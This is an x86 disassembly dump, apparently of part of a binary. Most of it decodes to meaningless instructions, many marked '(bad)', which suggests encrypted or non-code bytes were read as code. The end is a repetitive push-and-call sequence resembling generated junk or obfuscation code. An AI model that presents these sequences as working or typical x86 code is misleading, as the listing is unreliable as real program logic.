  419afa:	and    edi,DWORD PTR [edx+ebp*2]
  419afd:	mov    ?,WORD PTR [eax-0x5a]
  419b00:	lods   eax,DWORD PTR ds:[esi]
  419b01:	sar    DWORD PTR [eax+eiz*8-0x34],cl
  419b05:	mov    dl,0x65
  419b07:	cs jmp 0x23ce:0xd3fa281f
  419b0f:	daa    
  419b10:	adc    ebx,DWORD PTR [edx]
  419b12:	icebp  
  419b13:	(bad)  
  419b15:	mov    es,WORD PTR [edx-0x2c]
  419b18:	lods   eax,DWORD PTR ds:[esi]
  419b19:	jl     0x419b23
  419b1b:	mov    al,0xc
  419b1d:	cld    
  419b1e:	ins    DWORD PTR es:[edi],dx
  419b1f:	and    eax,0xcf5c16da
  419b24:	test   DWORD PTR [ecx-0x73],edx
  419b27:	push   edi
  419b28:	repnz (bad) 
  419b2a:	rol    bl,cl
  419b2c:	or     ecx,ebp
  419b2e:	xor    DWORD PTR [esi+edx*8+0x25],eax
  419b32:	inc    ebp
  419b33:	fsubr  st,st(0)
  419b35:	bound  ebx,QWORD PTR gs:[ebp+0x3a]
  419b39:	cmp    BYTE PTR [si-0x14],dh
  419b3d:	pop    edx
  419b3e:	fst    QWORD PTR [eax+0x71]
  419b41:	iret   
  419b42:	and    al,0x9f
  419b44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b45:	jo     0x419bb5
  419b47:	xor    al,0x5c
  419b49:	test   eax,0x8dda2930
  419b4e:	sar    BYTE PTR [edi-0x2388459],cl
  419b54:	out    dx,al
  419b55:	(bad)  
  419b56:	jmp    0x419b6e
  419b58:	add    DWORD PTR [esi-0x67fc198f],esp
  419b5e:	fcmovu st,st(5)
  419b60:	ficom  DWORD PTR [esi+ebx*1]
  419b63:	xor    eax,0x71c306d4
  419b68:	ja     0x419bb0
  419b6a:	xor    dl,ah
  419b6c:	jo     0x419bae
  419b6e:	das    
  419b6f:	xchg   BYTE PTR [edx],bl
  419b71:	fistp  QWORD PTR [esi]
  419b73:	xchg   esi,eax
  419b74:	fimul  DWORD PTR [ecx+0x42]
  419b77:	mov    edi,0xf7f0d702
  419b7c:	or     dh,dl
  419b7e:	enter  0x5c19,0x2e
  419b82:	sub    edi,DWORD PTR ds:0xef54282d
  419b88:	push   0xffffffac
  419b8a:	scas   al,BYTE PTR es:[edi]
  419b8b:	mov    al,ds:0x4b827330
  419b90:	out    dx,al
  419b91:	cmc    
  419b92:	sbb    al,0xd4
  419b94:	gs das 
  419b96:	inc    ecx
  419b97:	sub    esi,edi
  419b99:	push   ebx
  419b9a:	shr    BYTE PTR [edi],cl
  419b9c:	test   BYTE PTR [ebx+0x22a2763],0xea
  419ba3:	jae    0x419ba5
  419ba5:	dec    esi
  419ba6:	push   ebp
  419ba7:	inc    ebp
  419ba8:	lock aam 0x1e
  419bab:	cmp    esp,DWORD PTR [edi+0x59]
  419bae:	add    eax,0x8b755f0b
  419bb3:	adc    ecx,DWORD PTR [ecx-0x37]
  419bb6:	jno    0x419b73
  419bb8:	loope  0x419bb3
  419bba:	dec    ebp
  419bbb:	xor    eax,0xd40c67e8
  419bc0:	jg     0x419bae
  419bc2:	pop    es
  419bc3:	(bad)  
  419bc4:	in     al,dx
  419bc5:	mov    dh,0x7b
  419bc7:	(bad)  
  419bc8:	in     al,dx
  419bc9:	scas   eax,DWORD PTR es:[edi]
  419bca:	jno    0x419bcc
  419bcc:	push   esi
  419bcd:	cmp    dh,BYTE PTR [ebx]
  419bcf:	pop    esi
  419bd0:	iret   
  419bd1:	sbb    eax,0x7c02d38e
  419bd6:	test   al,0x63
  419bd8:	les    ebx,FWORD PTR [si]
  419bdb:	adc    edi,DWORD PTR [ebx+eax*1-0x45a5a381]
  419be2:	cmp    eax,0x754934c5
  419be7:	xlat   BYTE PTR ds:[ebx]
  419be8:	ret    
  419be9:	mov    al,0x12
  419beb:	jl     0x419c06
  419bed:	(bad)  
  419bee:	shl    BYTE PTR [edi],cl
  419bf0:	mov    ah,0x13
  419bf2:	mov    esi,0xf0d4da1c
  419bf7:	rol    al,1
  419bf9:	call   0xd6a3356f
  419bfe:	leave  
  419bff:	adc    edx,DWORD PTR ds:0x37df7ae7
  419c05:	imul   ebp,DWORD PTR [edx-0x63],0x981cb5d2
  419c0c:	pop    ecx
  419c0d:	mov    esp,0x7b0e6b9f
  419c12:	pushf  
  419c13:	mov    bh,0x99
  419c15:	pushf  
  419c16:	xor    bh,BYTE PTR [eax]
  419c18:	call   0x8f0b:0x6cce20d6
  419c1f:	push   eax
  419c20:	fisubr DWORD PTR [edx+0x60]
  419c23:	jmp    0x419c8d
  419c25:	pop    ecx
  419c26:	push   ss
  419c27:	and    eax,0xa890d682
  419c2c:	dec    esi
  419c2d:	out    0xf1,al
  419c2f:	xchg   ebx,eax
  419c30:	jno    0x419bcd
  419c32:	jno    0x419c4a
  419c34:	mov    ebp,0xed2e9d8c
  419c39:	inc    esi
  419c3a:	xchg   ebp,eax
  419c3b:	shl    DWORD PTR [ebx+0x63],cl
  419c3e:	test   eax,0xc7d98143
  419c43:	push   0xec3c6dd3
  419c48:	lahf   
  419c49:	sbb    DWORD PTR [ecx+0x72],edx
  419c4c:	mov    esp,0x96d42896
  419c51:	fst    st(2)
  419c53:	pop    edx
  419c54:	outs   dx,BYTE PTR ds:[esi]
  419c55:	mov    DWORD PTR [edi+0x47],esi
  419c58:	mov    ds:0xeeadb206,al
  419c5d:	sub    BYTE PTR [esi+0x6f],0x51
  419c61:	dec    ebx
  419c62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c63:	sub    al,0x1a
  419c65:	addr16 mov ch,0x82
  419c68:	adc    bh,cl
  419c6a:	push   edx
  419c6b:	adc    dh,BYTE PTR [edi-0x61cc8b1c]
  419c71:	iret   
  419c72:	jae    0x419c36
  419c74:	mov    ebp,0x5a26a216
  419c79:	retf   0x85e9
  419c7c:	aas    
  419c7d:	add    al,0x80
  419c7f:	out    0xb3,eax
  419c81:	mov    edx,0x1c2128e4
  419c86:	arpl   WORD PTR [edx+0x5],ax
  419c89:	cmp    DWORD PTR [ecx+0x20],edx
  419c8c:	les    eax,FWORD PTR ds:0x35bc8db6
  419c92:	xchg   ebx,eax
  419c93:	dec    edx
  419c94:	cld    
  419c95:	pop    ds
  419c96:	xor    DWORD PTR ds:0x804ec9ac,edx
  419c9c:	xor    dl,BYTE PTR [edi+0x2cda2db8]
  419ca2:	stos   DWORD PTR es:[edi],eax
  419ca3:	sbb    al,0x8b
  419ca5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ca6:	sbb    edi,DWORD PTR [edx+ebx*8]
  419ca9:	mov    ebx,0x83b3cd62
  419cae:	dec    ebp
  419caf:	mov    esi,0x8b82d2ec
  419cb4:	mov    ds:0xea9b5440,al
  419cb9:	push   cs
  419cba:	jg     0x419cfa
  419cbc:	cmp    cl,BYTE PTR [ebx]
  419cbe:	(bad)  
  419cbf:	in     eax,dx
  419cc0:	mov    dl,BYTE PTR [ecx+ebp*4]
  419cc3:	pop    eax
  419cc4:	shr    esi,1
  419cc6:	push   eax
  419cc7:	jns    0x419d12
  419cc9:	(bad)  
  419cca:	xchg   DWORD PTR [edi+0x2f],edi
  419ccd:	stc    
  419cce:	fwait
  419ccf:	pop    edx
  419cd0:	retf   0x5bbf
  419cd3:	push   ecx
  419cd4:	jnp    0x419cac
  419cd6:	in     al,0xf
  419cd8:	jge    0x419d49
  419cda:	mov    al,ds:0x65ee67a6
  419cdf:	(bad)  
  419ce0:	and    bh,BYTE PTR [ebp-0x7eccac8e]
  419ce6:	fsubrp st(0),st
  419ce8:	(bad)  
  419cea:	ret    
  419ceb:	adc    al,0x76
  419ced:	xchg   edi,eax
  419cee:	inc    edi
  419cef:	fistp  WORD PTR [ebx+edi*4]
  419cf2:	jno    0x419d45
  419cf4:	ret    0x4b8b
  419cf7:	xor    DWORD PTR [ebx+0x36],edi
  419cfa:	rcl    BYTE PTR [edi+0x40b4445a],1
  419d00:	pop    edx
  419d01:	ins    BYTE PTR es:[edi],dx
  419d02:	pop    ss
  419d03:	inc    edi
  419d04:	retf   
  419d05:	push   DWORD PTR gs:[ecx]
  419d08:	fimul  DWORD PTR [eax+edx*2+0x0]
  419d0c:	adc    al,0xfc
  419d0e:	ret    
  419d0f:	jecxz  0x419cb1
  419d11:	(bad)  
  419d12:	cld    
  419d13:	xchg   ebp,eax
  419d14:	or     al,0x20
  419d16:	outs   dx,BYTE PTR ds:[esi]
  419d17:	loopne 0x419d67
  419d19:	mov    ecx,cs
  419d1b:	jb     0x419d24
  419d1d:	out    dx,eax
  419d1e:	test   BYTE PTR [ebx-0x730dde26],bl
  419d24:	inc    esi
  419d25:	in     eax,dx
  419d26:	sbb    al,BYTE PTR [ecx+0x22]
  419d29:	popa   
  419d2a:	xlat   BYTE PTR ds:[ebx]
  419d2b:	rol    ebp,cl
  419d2d:	or     BYTE PTR [edi],0xf4
  419d30:	out    0xff,eax
  419d32:	pop    ebp
  419d33:	fimul  DWORD PTR gs:[eax-0x62bd940a]
  419d3a:	sub    ebp,ebx
  419d3c:	mov    ebx,0x36f11ed5
  419d41:	lods   eax,DWORD PTR ds:[esi]
  419d42:	xchg   edi,eax
  419d43:	leave  
  419d44:	jnp    0x419cee
  419d46:	jno    0x419cea
  419d48:	jns    0x419d7a
  419d4a:	(bad)  
  419d4b:	loopne 0x419d2e
  419d4d:	inc    ebp
  419d4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d4f:	sar    DWORD PTR [ebx+esi*4-0x68532338],cl
  419d56:	cwde   
  419d57:	push   ecx
  419d58:	ficomp DWORD PTR [ebx-0x10eb6597]
  419d5e:	xchg   esi,eax
  419d5f:	and    al,0x81
  419d61:	jmp    0xeb2b:0x4d52d3c3
  419d68:	and    edi,eax
  419d6a:	pop    edi
  419d6b:	inc    ebx
  419d6c:	mov    ebp,0xda9edf4f
  419d71:	cmp    BYTE PTR [ecx-0x4c],al
  419d74:	or     al,BYTE PTR [eax+0x63]
  419d77:	mov    esp,0x5947f2c
  419d7c:	or     al,0xd3
  419d7e:	push   esp
  419d7f:	js     0x419d73
  419d81:	shr    DWORD PTR [edx],1
  419d83:	mov    edx,0x539809d9
  419d88:	push   edx
  419d89:	mov    edi,0xd6795e01
  419d8e:	adc    DWORD PTR cs:[edi],edi
  419d91:	mov    bl,0xec
  419d93:	(bad)  
  419d95:	push   ebp
  419d96:	jno    0x419ded
  419d98:	add    al,0xa8
  419d9a:	add    al,0xa1
  419d9c:	not    ebx
  419d9e:	inc    esi
  419d9f:	aam    0x92
  419da1:	push   ds
  419da2:	nop
  419da3:	mov    ebx,0x3013ac5
  419da8:	fisub  DWORD PTR [ebx]
  419daa:	imul   ecx,ebx,0xffffffed
  419dad:	rcr    DWORD PTR [ecx],1
  419daf:	cmp    DWORD PTR [ebx-0xa],esi
  419db2:	in     eax,dx
  419db3:	pop    esp
  419db4:	xchg   ecx,eax
  419db5:	fwait
  419db6:	or     edi,DWORD PTR [edi+0x59]
  419db9:	mov    ebp,0xce65e0c7
  419dbe:	pop    ecx
  419dbf:	fsubr  QWORD PTR [ebx+0x4f2b715a]
  419dc5:	sti    
  419dc6:	leave  
  419dc7:	dec    esi
  419dc8:	or     DWORD PTR [ecx+0x5b],0x62
  419dcc:	icebp  
  419dcd:	aad    0x60
  419dcf:	push   ss
  419dd0:	sub    eax,0xd60b9b12
  419dd5:	(bad)  
  419dd6:	ss lock xchg edi,eax
  419dd9:	call   0xc71:0x4805bca8
  419de0:	jne    0x419e03
  419de2:	pop    ss
  419de3:	push   ebp
  419de4:	rcl    ch,cl
  419de6:	cmp    ebp,DWORD PTR ds:0xdaa1e88b
  419dec:	mov    esp,0xdade85fe
  419df1:	mov    edx,0xd904ac1e
  419df6:	mov    ch,0xf8
  419df8:	adc    esi,0x88564ad6
  419dfe:	and    al,0x6c
  419e00:	add    bl,BYTE PTR [ecx+0x58b63571]
  419e06:	add    BYTE PTR [esi],dh
  419e08:	aad    0xcb
  419e0a:	(bad)  
  419e0b:	rcr    dh,cl
  419e0d:	xchg   edx,eax
  419e0e:	outs   dx,DWORD PTR ds:[esi]
  419e0f:	stos   DWORD PTR es:[edi],eax
  419e10:	in     eax,dx
  419e11:	pop    ecx
  419e12:	pop    es
  419e13:	data16 sbb BYTE PTR [esi+0x41],dh
  419e17:	jno    0x419e8f
  419e19:	inc    esi
  419e1a:	dec    esp
  419e1b:	mov    al,BYTE PTR [edi+ecx*8-0x5e684992]
  419e22:	mov    WORD PTR [ecx-0x596ec40e],fs
  419e28:	add    eax,0x568870fb
  419e2d:	sahf   
  419e2e:	repnz mov edx,0xc4e40c57
  419e34:	call   0xb420:0xd5688ee9
  419e3b:	adc    esp,DWORD PTR [ebx-0x338e85ed]
  419e41:	sbb    ch,BYTE PTR [edx+0x49b6af63]
  419e47:	sub    bh,bl
  419e49:	es push ecx
  419e4b:	aam    0x5d
  419e4d:	(bad)  
  419e4e:	xchg   ecx,eax
  419e4f:	enter  0x36ee,0x58
  419e53:	es stos DWORD PTR es:[edi],eax
  419e55:	cmp    BYTE PTR [ecx+0x2cd63363],al
  419e5b:	test   eax,0x93e9def8
  419e60:	ret    0x7113
  419e63:	das    
  419e64:	cmp    esp,esp
  419e66:	xchg   ecx,eax
  419e67:	inc    esi
  419e68:	popf   
  419e69:	or     al,0x10
  419e6b:	aam    0x86
  419e6d:	inc    esp
  419e6e:	dec    esi
  419e6f:	popa   
  419e70:	add    al,0xce
  419e72:	jl     0x419ecd
  419e74:	(bad)  
  419e75:	sbb    BYTE PTR [ecx],ch
  419e77:	mov    ecx,0x90f13e18
  419e7c:	(bad)  
  419e7d:	and    eax,0x76efd457
  419e82:	fst    QWORD PTR [edi-0x67721bb8]
  419e88:	lahf   
  419e89:	sub    esi,esp
  419e8b:	push   ebx
  419e8c:	pop    esp
  419e8d:	lods   al,BYTE PTR ds:[esi]
  419e8e:	pop    ds
  419e8f:	scas   al,BYTE PTR es:[edi]
  419e90:	add    al,BYTE PTR [esi]
  419e92:	xchg   ebp,eax
  419e93:	cdq    
  419e94:	sar    DWORD PTR [ebx-0xf],cl
  419e97:	or     BYTE PTR [ecx-0x33b9cced],ch
  419e9d:	outs   dx,BYTE PTR ds:[esi]
  419e9e:	jno    0x419e7b
  419ea0:	push   es
  419ea1:	sahf   
  419ea2:	dec    eax
  419ea3:	mov    dh,0x16
  419ea5:	mov    dl,0xbe
  419ea7:	xchg   ecx,ecx
  419ea9:	xchg   DWORD PTR [ecx-0x14],esi
  419eac:	sub    bl,al
  419eae:	mov    ecx,0xfb1e1393
  419eb3:	sbb    ebx,edx
  419eb5:	fist   DWORD PTR [edi+0x6132a16e]
  419ebb:	jno    0x419e93
  419ebd:	inc    ecx
  419ebe:	fcmovbe st,st(3)
  419ec0:	xchg   edx,eax
  419ec1:	dec    edi
  419ec2:	pop    es
  419ec3:	lods   al,BYTE PTR ds:[esi]
  419ec4:	imul   esp,esi,0x9cccc976
  419eca:	es jmp 0xf0828e6a
  419ed0:	jecxz  0x419e58
  419ed2:	ror    DWORD PTR [edx],1
  419ed4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ed5:	cli    
  419ed6:	sti    
  419ed7:	shr    DWORD PTR [edi-0x68],cl
  419eda:	push   cs
  419edb:	jo     0x419ec5
  419edd:	dec    eax
  419ede:	retf   
  419edf:	push   ss
  419ee0:	fiadd  DWORD PTR [eax]
  419ee2:	ins    BYTE PTR es:[edi],dx
  419ee3:	jmp    0x8d287c9b
  419ee8:	xor    esi,edx
  419eea:	rcr    DWORD PTR [ebx-0x43eed12e],cl
  419ef0:	inc    ebx
  419ef1:	daa    
  419ef2:	jno    0x419f55
  419ef4:	lock ins DWORD PTR es:[edi],dx
  419ef6:	dec    ebx
  419ef7:	push   edi
  419ef8:	pop    ebx
  419ef9:	inc    eax
  419efa:	or     al,ah
  419efc:	setge  BYTE PTR [ebp+0xd]
  419f00:	fidivr DWORD PTR [ecx+0x67b290a7]
  419f06:	adc    BYTE PTR [ebx-0x26],dl
  419f09:	lock inc ecx
  419f0b:	leave  
  419f0c:	sbb    al,0x35
  419f0e:	jge    0x419e92
  419f10:	pop    edx
  419f11:	mov    edi,0xd64b7578
  419f16:	pop    edx
  419f17:	jno    0x419ed6
  419f19:	adc    BYTE PTR [esi+edi*2],bl
  419f1c:	fidivr DWORD PTR [esi+ecx*4-0x54]
  419f20:	xchg   ebp,eax
  419f21:	cdq    
  419f22:	pop    edi
  419f23:	jmp    0xd412f99b
  419f28:	add    eax,edi
  419f2a:	cli    
  419f2b:	xlat   BYTE PTR ds:[ebx]
  419f2c:	sbb    dh,dh
  419f2e:	mov    eax,DWORD PTR [ebp-0x26]
  419f31:	inc    edx
  419f32:	int3   
  419f33:	mov    ebp,0x379f1d63
  419f38:	call   ebp
  419f3a:	(bad)  
  419f3b:	sti    
  419f3c:	adc    BYTE PTR [eax-0x5c],bl
  419f3f:	loopne 0x419efa
  419f41:	lock ins DWORD PTR es:[edi],dx
  419f43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f44:	test   esp,esp
  419f46:	ins    BYTE PTR es:[edi],dx
  419f47:	and    BYTE PTR [edi],cl
  419f49:	idiv   al
  419f4b:	sbb    al,0x86
  419f4d:	(bad)  
  419f4e:	addr16 cmp al,0x5
  419f51:	mov    edi,esi
  419f53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f54:	dec    eax
  419f55:	test   DWORD PTR [ecx+0x4b],esi
  419f58:	ret    0xd5f4
  419f5b:	jne    0x419efd
  419f5d:	mov    es,WORD PTR [ecx-0x2c]
  419f60:	dec    ecx
  419f61:	fmul   QWORD PTR [ecx+0x74]
  419f64:	push   0xdaf2c865
  419f69:	mov    DWORD PTR [eax+0x22],ecx
  419f6c:	push   eax
  419f6d:	iret   
  419f6e:	(bad)  
  419f6f:	and    al,0x5d
  419f71:	fs jge 0x419f53
  419f74:	aas    
  419f75:	(bad)  
  419f76:	mov    ebx,0xf95435d4
  419f7b:	(bad)  
  419f7c:	adc    DWORD PTR [ebx+0x71],esi
  419f7f:	ror    DWORD PTR [ecx-0x16],0xae
  419f83:	(bad)  
  419f84:	jmp    0x585ddd7d
  419f89:	(bad)  
  419f8a:	pop    es
  419f8b:	(bad)  
  419f8c:	ins    DWORD PTR es:[edi],dx
  419f8d:	mov    ds:0x7a82bca1,al
  419f92:	outs   dx,DWORD PTR ds:[esi]
  419f93:	pop    esp
  419f94:	std    
  419f95:	and    eax,0xf5e0e58b
  419f9a:	ins    DWORD PTR es:[edi],dx
  419f9b:	rol    DWORD PTR [edx-0x2f],cl
  419f9e:	ret    0x5455
  419fa1:	sub    ah,BYTE PTR [ebx+0x70fc2ebf]
  419fa7:	mov    al,ds:0x37e7b24e
  419fac:	adc    edi,DWORD PTR [ebx-0x1364bea3]
  419fb2:	fnsave [esi+ebp*2+0x32d6b1d1]
  419fb9:	mov    al,0x94
  419fbb:	jns    0x419ff4
  419fbd:	(bad)  
  419fbe:	inc    edi
  419fbf:	xor    eax,0x3958a470
  419fc4:	pushf  
  419fc5:	push   cs
  419fc6:	jno    0x419fdc
  419fc8:	xchg   edi,eax
  419fc9:	sahf   
  419fca:	outs   dx,BYTE PTR ds:[esi]
  419fcb:	pop    edi
  419fcc:	leave  
  419fcd:	push   esp
  419fce:	je     0x41a032
  419fd0:	mov    eax,0xd418d486
  419fd5:	mov    edx,0xcb39593a
  419fda:	xchg   esp,eax
  419fdb:	pop    ebx
  419fdc:	ficom  DWORD PTR [eax+eax*4+0x71729d43]
  419fe3:	adc    ch,al
  419fe5:	mov    bl,BYTE PTR [esi]
  419fe7:	jl     0x419f9b
  419fe9:	mov    cl,0x43
  419feb:	aam    0xb1
  419fed:	mov    ecx,0x7f5c165a
  419ff2:	test   DWORD PTR [eax-0x26],edx
  419ff5:	repnz ss sbb eax,0xe31c4416
  419ffc:	adc    dh,0xe5
  419fff:	enter  0x8797,0x72
  41a003:	popa   
  41a004:	lea    ebx,[ecx]
  41a006:	outs   dx,DWORD PTR ds:[esi]
  41a007:	jl     0x41a05f
  41a009:	mov    eax,ds:0x6e3e9311
  41a00e:	and    DWORD PTR [ebp+0x7c],0x44f67fd6
  41a015:	(bad)  
  41a016:	sbb    ebx,DWORD PTR [ecx]
  41a018:	jge    0x419fdc
  41a01a:	push   edx
  41a01b:	pop    ebp
  41a01c:	(bad)  
  41a01d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a01e:	jmp    0xe062:0xd0e0fc50
  41a025:	sbb    eax,0xb2b5c65b
  41a02a:	mov    DWORD PTR [eax-0x4f],ebp
  41a02d:	cld    
  41a02e:	lock push eax
  41a030:	adc    DWORD PTR [ecx+0x33a0f50e],eax
  41a036:	retf   
  41a037:	rol    BYTE PTR ds:0x13a4fea9,1
  41a03d:	out    dx,al
  41a03e:	xor    al,0x55
  41a040:	and    eax,0x2c1337d6
  41a045:	adc    DWORD PTR [ebx],ebx
  41a047:	repz pop DWORD PTR [ecx]
  41a04a:	pop    edi
  41a04b:	ds jo  0x41a015
  41a04e:	arpl   WORD PTR [edi-0x6e],bp
  41a051:	xor    eax,0x50fe04a
  41a056:	mov    cl,0x4b
  41a058:	scas   al,BYTE PTR es:[edi]
  41a059:	(bad)  
  41a05a:	jbe    0x41a0cd
  41a05c:	jl     0x41a0a2
  41a05e:	jnp    0x419ffe
  41a060:	loope  0x41a0a0
  41a062:	outs   dx,BYTE PTR ds:[esi]
  41a063:	in     eax,0xe7
  41a065:	sar    BYTE PTR [esi],cl
  41a067:	sub    al,0x9f
  41a069:	not    ah
  41a06b:	and    eax,0x5457d675
  41a070:	push   cs
  41a071:	jne    0x41a0b0
  41a073:	mov    ds:0xe4fd64c6,eax
  41a078:	shl    DWORD PTR [ebx-0x1609a8c6],cl
  41a07e:	mov    al,ds:0xac050235
  41a083:	out    0x9a,eax
  41a085:	(bad)  
  41a086:	retf   
  41a087:	mov    edi,0x979269e1
  41a08c:	pusha  
  41a08d:	push   edi
  41a08e:	jno    0x41a0fd
  41a090:	add    DWORD PTR [ebx-0x726956cc],0xffffffd9
  41a097:	rcl    BYTE PTR [edx+eax*8-0x4f3cbf96],1
  41a09e:	mov    cl,0xd
  41a0a0:	daa    
  41a0a1:	loope  0x41a10c
  41a0a3:	jecxz  0x41a0d0
  41a0a5:	mov    eax,0xe20a3630
  41a0aa:	addr16 xchg ecx,eax
  41a0ac:	(bad)  
  41a0ad:	(bad)  
  41a0ae:	xchg   ecx,eax
  41a0af:	test   BYTE PTR ds:0x90623f15,dl
  41a0b5:	lods   eax,DWORD PTR ds:[esi]
  41a0b6:	lea    ebp,[edi+edx*8-0x2f]
  41a0ba:	stos   DWORD PTR es:[edi],eax
  41a0bb:	dec    ecx
  41a0bc:	loope  0x41a137
  41a0be:	ds in  al,dx
  41a0c0:	xor    BYTE PTR [ebp+0x267dd3c4],bh
  41a0c6:	xor    eax,0x4053275b
  41a0cb:	test   eax,0x17c1f2da
  41a0d0:	aaa    
  41a0d1:	lahf   
  41a0d2:	add    al,0x80
  41a0d4:	fwait
  41a0d5:	(bad)  
  41a0d6:	lahf   
  41a0d7:	stc    
  41a0d8:	enter  0x1e,0x2e
  41a0dc:	pop    esi
  41a0dd:	out    dx,eax
  41a0de:	ins    DWORD PTR es:[edi],dx
  41a0df:	adc    al,0xdf
  41a0e1:	repz std 
  41a0e3:	int3   
  41a0e4:	mov    ds:0x5a209d37,al
  41a0e9:	fs or  al,0x3b
  41a0ec:	into   
  41a0ed:	(bad)  
  41a0ee:	dec    eax
  41a0ef:	jmp    0x41a14a
  41a0f1:	sbb    esp,esi
  41a0f3:	mov    ebp,0x68715b87
  41a0f8:	ss ja  0x41a090
  41a0fb:	push   cs
  41a0fc:	mov    ebx,0xd898183f
  41a101:	shr    DWORD PTR [edx+0x3f],cl
  41a104:	sbb    eax,0x5af5d588
  41a109:	xor    eax,0xe0df0025
  41a10e:	jo     0x41a0ab
  41a110:	mov    di,0x51ec
  41a114:	pushf  
  41a115:	xor    DWORD PTR [ebx+edx*8+0x6f],0xffffffa4
  41a11a:	or     al,ch
  41a11c:	xchg   esi,eax
  41a11d:	jae    0x41a120
  41a11f:	jg     0x41a0fb
  41a121:	out    0x92,al
  41a123:	adc    BYTE PTR [ecx-0x7bc4aa32],dh
  41a129:	(bad)  
  41a12a:	clc    
  41a12b:	add    BYTE PTR [ebp-0x75],dl
  41a12e:	in     al,dx
  41a12f:	sub    esp,0x54
  41a132:	push   0x2b
  41a134:	call   0x41c4c4
  41a139:	add    esp,0x4
  41a13c:	push   0xe61c7500
  41a141:	push   0xffffffcd
  41a143:	push   0xffffff8a
  41a145:	push   0xc2041900
  41a14a:	call   0x41c5c5
  41a14f:	add    esp,0x10
  41a152:	push   ebx
  41a153:	mov    eax,0xfa
  41a158:	mov    DWORD PTR [ebp-0x8],eax
  41a15b:	call   0x41c72f
  41a160:	push   esi
  41a161:	mov    eax,0x72
  41a166:	sub    DWORD PTR [ebp-0x8],eax
  41a169:	push   0x3c
  41a16b:	push   eax
  41a16c:	call   0x41c20f
  41a171:	add    esp,0x8
  41a174:	push   edi
  41a175:	push   eax
  41a176:	push   0xcad71100
  41a17b:	call   0x41c13c
  41a180:	add    esp,0x8
  41a183:	push   0xa578800
  41a188:	push   eax
  41a189:	push   eax
  41a18a:	push   eax
  41a18b:	call   0x41c330
  41a190:	add    esp,0x10
  41a193:	mov    ecx,DWORD PTR [ebp-0x8]
  41a196:	mov    esi,0xd4
  41a19b:	sub    ecx,eax
  41a19d:	push   0x3e
  41a19f:	call   0x41c13c
  41a1a4:	add    esp,0x4
  41a1a7:	add    DWORD PTR [ebp-0x8],esi
  41a1aa:	push   0x24
  41a1ac:	call   0x41c20f
  41a1b1:	add    esp,0x4
  41a1b4:	mov    edi,0xcb
  41a1b9:	push   esi
  41a1ba:	push   eax
  41a1bb:	push   0xffffffd1
  41a1bd:	push   edi
  41a1be:	call   0x41c72f
  41a1c3:	add    esp,0x10
  41a1c6:	and    esi,eax
  41a1c8:	call   0x41c13c
  41a1cd:	call   0x41c20f
  41a1d2:	sub    DWORD PTR [ebp-0x8],esi
  41a1d5:	push   0x1a01e400
  41a1da:	push   0xffffffe9
  41a1dc:	call   0x41c72f
  41a1e1:	add    esp,0x8
  41a1e4:	mov    edx,DWORD PTR [ebp-0x8]
  41a1e7:	push   0xc2748500
  41a1ec:	push   0xffffffc9
  41a1ee:	push   edi
  41a1ef:	call   0x41c4c4
  41a1f4:	add    esp,0xc
  41a1f7:	push   0x5d
  41a1f9:	push   0xffffffa6
  41a1fb:	push   esi
  41a1fc:	call   0x41c13c
  41a201:	add    esp,0xc
  41a204:	push   edi
  41a205:	push   eax
  41a206:	call   0x41c20f
  41a20b:	add    esp,0x8
  41a20e:	push   0xc6312400
  41a213:	call   0x41c5c5
  41a218:	add    esp,0x4
  41a21b:	push   esi
  41a21c:	push   0xfffffffb
  41a21e:	push   esi
  41a21f:	push   0x90ab8000
  41a224:	call   0x41c4c4
  41a229:	add    esp,0x10
  41a22c:	push   eax
  41a22d:	push   eax
  41a22e:	push   0x8aab8f00
  41a233:	call   0x41c72f
  41a238:	add    esp,0xc
  41a23b:	push   0xe
  41a23d:	push   0xffffffe9
  41a23f:	push   edi
  41a240:	push   0xc65a5000
  41a245:	call   0x41c5c5
  41a24a:	add    esp,0x10
  41a24d:	push   edi
  41a24e:	push   0xffffffd1
  41a250:	call   0x41c72f
  41a255:	add    esp,0x8
  41a258:	push   0x1b
  41a25a:	push   0xffffff8f
  41a25c:	push   esi
  41a25d:	push   0x3d
  41a25f:	call   0x41c5c5
  41a264:	add    esp,0x10
  41a267:	push   0xee5ea900
  41a26c:	push   0xffffffd8
  41a26e:	push   0xfffffff0
  41a270:	push   esi
  41a271:	push   0x73
  41a273:	call   0x41c20f
  41a278:	add    esp,0x14
  41a27b:	mov    ecx,0xdf
  41a280:	mov    edx,edi
  41a282:	push   0x526b6f00
  41a287:	push   esi
  41a288:	push   0x74
  41a28a:	push   0x32ba7400
  41a28f:	call   0x41c4c4
  41a294:	add    esp,0x10
  41a297:	add    eax,esi
  41a299:	mov    ebx,DWORD PTR [ebp-0x8]
  41a29c:	mov    esi,DWORD PTR [ebp-0x8]
  41a29f:	push   0x204d800
  41a2a4:	push   0x20849f00
  41a2a9:	push   0x4e39e100
  41a2ae:	call   0x41c72f
  41a2b3:	add    esp,0xc
  41a2b6:	call   0x41c20f
  41a2bb:	push   0x45
  41a2bd:	push   ebx
  41a2be:	push   0x1f
  41a2c0:	push   0xa090fa00
  41a2c5:	call   0x41c72f
  41a2ca:	add    esp,0x10
  41a2cd:	cmp    ebx,esi
  41a2cf:	jne    0x41a309
  41a2d1:	cmp    esi,ebx
  41a2d3:	jne    0x41a309
  41a2d5:	xor    ebx,ebx
  41a2d7:	sub    DWORD PTR [ebp-0x8],esi
  41a2da:	push   0x20fd2400
  41a2df:	push   0x79
  41a2e1:	push   eax
  41a2e2:	push   eax
  41a2e3:	push   0xffffff98
  41a2e5:	call   0x41c20f
  41a2ea:	add    esp,0x14
  41a2ed:	push   0xffffffa2
  41a2ef:	push   edi
  41a2f0:	call   0x41c72f
  41a2f5:	add    esp,0x8
  41a2f8:	sub    ebx,esi
  41a2fa:	sub    ebx,eax
  41a2fc:	add    ebx,ebx
  41a2fe:	cmp    ebx,DWORD PTR ds:0x4240a4
  41a304:	jne    0x41a309
  41a306:	sub    DWORD PTR [ebp-0x8],ebx
  41a309:	push   0x3e5fc800
  41a30e:	push   0xffffffc1
  41a310:	push   0x8a9efc00
  41a315:	call   0x41c5c5
  41a31a:	add    esp,0xc
